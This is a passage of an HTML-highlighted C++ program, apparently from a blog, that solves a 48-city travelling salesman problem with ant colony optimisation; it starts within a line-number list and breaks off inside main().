class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;fstream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;math.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;time.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> iAntCount=<span class=\"number\">10</span>;<span class=\"comment\">//ant numbers</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> iCityCount=<span class=\"number\">48</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> iItCount=<span class=\"number\">5000</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">double</span> Q=<span class=\"number\">100</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">double</span> alpha=<span class=\"number\">3.0</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">double</span> beta=<span class=\"number\">5.0</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">double</span> rou=<span class=\"number\">0.9</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">double</span> rain=<span class=\"number\">0.022</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">double</span> q0=<span class=\"number\">0.3</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> besttour[iCityCount+<span class=\"number\">1</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">double</span>  <span class=\"title\">rnd</span><span class=\"params\">(<span class=\"keyword\">int</span> low,<span class=\"keyword\">int</span> uper)</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">double</span> p=(rand()/(double)RAND_MAX)*((uper)-(low))+(low);<span class=\"number\">1</span>;</span><br><span class=\"line\">\treturn (p);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">rnd</span><span class=\"params\">(<span class=\"keyword\">int</span> uper)</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">\treturn (rand()%uper);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">struct</span> GInfo</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">double</span> m_dDeltTrial[iCityCount][iCityCount];</span><br><span class=\"line\">\t<span class=\"keyword\">double</span> m_dTrial[iCityCount][iCityCount];</span><br><span class=\"line\">\t<span class=\"keyword\">double</span> distance[iCityCount][iCityCount];</span><br><span class=\"line\">&#125;Map;</span><br><span class=\"line\"><span class=\"keyword\">class</span> ant</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">\t<span class=\"keyword\">double</span> prob[iCityCount];</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> m_iTopCity;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> allowed[iCityCount];</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">ChooseNextCity</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">UpdateProb</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">double</span> m_dLength;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> visited[iCityCount+<span class=\"number\">1</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">\tant();</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">addcity</span><span class=\"params\">(<span class=\"keyword\">int</span> city)</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">Clear</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">UpdateLength</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">move</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//void move2last();</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">ant::ant()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tm_dLength=<span class=\"number\">0</span>;</span><br><span class=\"line\">\tm_iTopCity=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;iCityCount;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tprob[i]=<span class=\"number\">0.5</span>;</span><br><span class=\"line\">\t\tallowed[i]=<span class=\"number\">1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">void</span> ant::addcity(<span class=\"keyword\">int</span> city)</span><br><span class=\"line\">&#123;<span class=\"comment\">//add city to tabu;</span></span><br><span class=\"line\">\tvisited[m_iTopCity]=city;</span><br><span class=\"line\">\tm_iTopCity++;</span><br><span class=\"line\">\tallowed[city]=<span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">void</span> ant::UpdateProb()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i;</span><br><span class=\"line\">\t<span class=\"keyword\">double</span> temp=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> curCity=visited[m_iTopCity<span class=\"number\">-1</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> c=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>;i&lt;iCityCount;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(allowed[i])</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">double</span> p=<span class=\"built_in\">pow</span>((<span class=\"number\">1.0</span>/Map.distance[curCity][i]),beta)*<span class=\"built_in\">pow</span>((Map.m_dTrial[curCity][i]),alpha);</span><br><span class=\"line\">\t\t\ttemp+=p;</span><br><span class=\"line\">\t\t\tc++;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>;i&lt;iCityCount;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(allowed[i])</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (temp==<span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t\tprob[i]=(double)<span class=\"number\">1.0</span>/(double)c;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t\t\tprob[i]=<span class=\"built_in\">pow</span>((<span class=\"number\">1.0</span>/Map.distance[curCity][i]),beta)*<span class=\"built_in\">pow</span>((Map.m_dTrial[curCity][i]),alpha)/temp;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t\tprob[i]=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">int</span> ant::ChooseNextCity()</span><br><span class=\"line\">&#123;<span class=\"comment\">//Update the probability of path selection</span></span><br><span class=\"line\">\t<span class=\"comment\">//select a path from tabu[m_iCityCount-1] to next</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i,j;</span><br><span class=\"line\">\t<span class=\"keyword\">double</span> temp;</span><br><span class=\"line\">\t<span class=\"keyword\">double</span> mRate=rnd(<span class=\"number\">0</span>,<span class=\"number\">1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> curCity=visited[m_iTopCity<span class=\"number\">-1</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">\tUpdateProb();</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (mRate&gt;q0)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\ttemp=<span class=\"number\">-1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>;i&lt;iCityCount;i++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//temp&lt;prob[i];</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(allowed[i])</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">double</span> p=<span class=\"built_in\">pow</span>((<span class=\"number\">1.0</span>/Map.distance[curCity][i]),beta)*<span class=\"built_in\">pow</span>((Map.m_dTrial[curCity][i]),alpha);</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (temp&lt;p)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\ttemp=p;</span><br><span class=\"line\">\t\t\t\t\tj=i;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">double</span> mSelect=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;iCityCount;i++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tmSelect+=prob[i] ;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (mSelect&gt;=mRate) &#123;j=i;<span class=\"keyword\">break</span>;&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn j;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">void</span> ant::UpdateLength()</span><br><span class=\"line\">&#123;<span class=\"comment\">// Update the length of tour</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;iCityCount;i++)</span><br><span class=\"line\">\t\tm_dLength+=Map.distance[visited[i]][visited[i+<span class=\"number\">1</span>]];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">void</span> ant::move()</span><br><span class=\"line\">&#123;<span class=\"comment\">//the ant move to next town and add town ID to tabu.</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> j;</span><br><span class=\"line\">\tj=ChooseNextCity();</span><br><span class=\"line\">\taddcity(j);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">void</span> ant::Clear()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tm_dLength=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;iCityCount;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tprob[i]=<span class=\"number\">0.5</span>;</span><br><span class=\"line\">\t\tallowed[i]=<span class=\"number\">1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\ti=visited[<span class=\"number\">0</span>];</span><br><span class=\"line\">\tm_iTopCity=<span class=\"number\">0</span>;</span><br><span class=\"line\">\taddcity(i);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">class</span> project</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">initmap</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">double</span> m_dShortest;</span><br><span class=\"line\">\tant ants[iAntCount];</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">UpdateTrial</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">GetAnt</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">StartSearch</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\tproject();</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">project::project()</span><br><span class=\"line\">&#123;<span class=\"comment\">//initial map,read map infomation from file . et.</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">struct</span> city</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> x;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span>  y;</span><br><span class=\"line\">\t&#125;cc[iCityCount];</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> num;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i;</span><br><span class=\"line\"></span><br><span class=\"line\">\tinitmap();</span><br><span class=\"line\"></span><br><span class=\"line\">\tm_dShortest=<span class=\"number\">10e9</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\">ifstream <span class=\"title\">in</span><span class=\"params\">(<span class=\"string\">\"48.txt\"</span>)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>;i&lt;iCityCount;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tin&gt;&gt;num&gt;&gt;cc[i].x&gt;&gt;cc[i].y;</span><br><span class=\"line\">\t\tbesttour[i]=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> j;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;iCityCount;i++)</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (j=<span class=\"number\">0</span>;j&lt;iCityCount;j++)</span><br><span class=\"line\">\t\t\tMap.distance[i][j]=<span class=\"built_in\">sqrt</span>(pow((cc[i].x-cc[j].x),<span class=\"number\">2</span>)+pow((cc[i].y-cc[j].y),<span class=\"number\">2</span>));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">void</span> project::initmap()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> j;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;iCityCount;i++)</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (j=<span class=\"number\">0</span>;j&lt;iCityCount;j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tMap.m_dTrial[i][j]=<span class=\"number\">1.0</span>/(double)iCityCount;</span><br><span class=\"line\">\t\t\tMap.m_dDeltTrial[i][j]=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">void</span> project::GetAnt()</span><br><span class=\"line\">&#123;<span class=\"comment\">//randomly put ant into map</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> city;</span><br><span class=\"line\">\tsrand( (unsigned)time( NULL ) +rand());</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>;i&lt;iAntCount;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tcity=rnd(iCityCount);</span><br><span class=\"line\">\t\tants[i].addcity(city);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">void</span> project::StartSearch()</span><br><span class=\"line\">&#123;<span class=\"comment\">//begin to find best solution</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> max=<span class=\"number\">0</span>;<span class=\"comment\">//every ant tours times</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> j;</span><br><span class=\"line\">\t<span class=\"keyword\">double</span> temp;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> temptour[iCityCount+<span class=\"number\">1</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (max&lt;iItCount)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>;i&lt;iCityCount<span class=\"number\">-1</span>;i++)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span>(j=<span class=\"number\">0</span>;j&lt;iAntCount;j++)</span><br><span class=\"line\">\t\t\t\tants[j].move();</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(j=<span class=\"number\">0</span>;j&lt;iAntCount;j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tants[j].visited[iCityCount]=ants[j].visited[<span class=\"number\">0</span>];</span><br><span class=\"line\">\t\t\tants[j].UpdateLength ();</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">//find out the best solution of the step and put it into temp</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> t;</span><br><span class=\"line\">\t\ttemp=ants[<span class=\"number\">0</span>].m_dLength ;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (t=<span class=\"number\">0</span>;t&lt;iCityCount+<span class=\"number\">1</span>;t++)</span><br><span class=\"line\">\t\t\ttemptour[t]=ants[<span class=\"number\">0</span>].visited[t];</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(j=<span class=\"number\">0</span>;j&lt;iAntCount;j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (temp&gt;ants[j].m_dLength) &#123;</span><br><span class=\"line\">\t\t\t\ttemp=ants[j].m_dLength;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">for</span> ( t=<span class=\"number\">0</span>;t&lt;iCityCount+<span class=\"number\">1</span>;t++)</span><br><span class=\"line\">\t\t\t\t\ttemptour[t]=ants[j].visited[t];</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(temp&lt;m_dShortest)&#123;</span><br><span class=\"line\">\t\t\tm_dShortest=temp;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d : %f\\n\"</span>,max,m_dShortest);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span> ( t=<span class=\"number\">0</span>;t&lt;iCityCount+<span class=\"number\">1</span>;t++)</span><br><span class=\"line\">\t\t\t\tbesttour[t]=temptour[t];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (max %<span class=\"number\">100</span>==<span class=\"number\">0</span>)<span class=\"built_in\">printf</span>(<span class=\"string\">\" %d \"</span>,max);</span><br><span class=\"line\">\t\tUpdateTrial();</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(j=<span class=\"number\">0</span>;j&lt;iAntCount;j++)</span><br><span class=\"line\">\t\t\tants[j].Clear();</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tmax++;</span><br><span class=\"line\">\t\t<span class=\"comment\">//char c;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">//scanf(\"%c\",&amp;c);</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"The shortest toure is : %f\\n\"</span>,m_dShortest);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> ( <span class=\"keyword\">int</span> t=<span class=\"number\">0</span>;t&lt;=iCityCount;t++)</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\" %d \"</span>,besttour[t]);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">void</span> project::UpdateTrial()</span><br><span class=\"line\">&#123;<span class=\"comment\">//calculate the changes of trial information</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> j;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>;i&lt;iCityCount;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (j=<span class=\"number\">0</span>;j&lt;iCityCount;j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//printf(\"trail is : %1.10f deltatrial is: %1.10f\\n\",Map.m_dTrial[i][j],Map.m_dDeltTrial[i][j]);</span></span><br><span class=\"line\">\t\t\tMap.m_dTrial[i][j]*=(<span class=\"number\">1</span>-rou);<span class=\"comment\">//*Map.m_dTrial[i][j]+Map.m_dDeltTrial[i][j] );</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">//Map.m_dProb[i][j]=</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">//Map.m_dDeltTrial[i][j]=0;</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;iAntCount;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (j=<span class=\"number\">0</span>;j&lt;iCityCount;j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tMap.m_dDeltTrial[ants[i].visited[j]][ants[i].visited[j+<span class=\"number\">1</span>]]+=Q/ants[i].m_dLength ;</span><br><span class=\"line\">\t\t\tMap.m_dDeltTrial[ants[i].visited[j+<span class=\"number\">1</span>]][ants[i].visited[j]]+=Q/ants[i].m_dLength;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>;i&lt;iCityCount;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (j=<span class=\"number\">0</span>;j&lt;iCityCount;j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//printf(\"trail is : %1.10f deltatrial is: %1.10f\\n\",Map.m_dTrial[i][j],Map.m_dDeltTrial[i][j]);</span></span><br><span class=\"line\">\t\t\tMap.m_dTrial[i][j]=rou*(Map.m_dTrial[i][j]+Map.m_dDeltTrial[i][j] );</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//Map.m_dProb[i][j]=</span></span><br><span class=\"line\">\t\t\tMap.m_dDeltTrial[i][j]=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">\tproject TSP;</span><br><span class=\"line\">\tTSP.GetAnt();</span><br><span 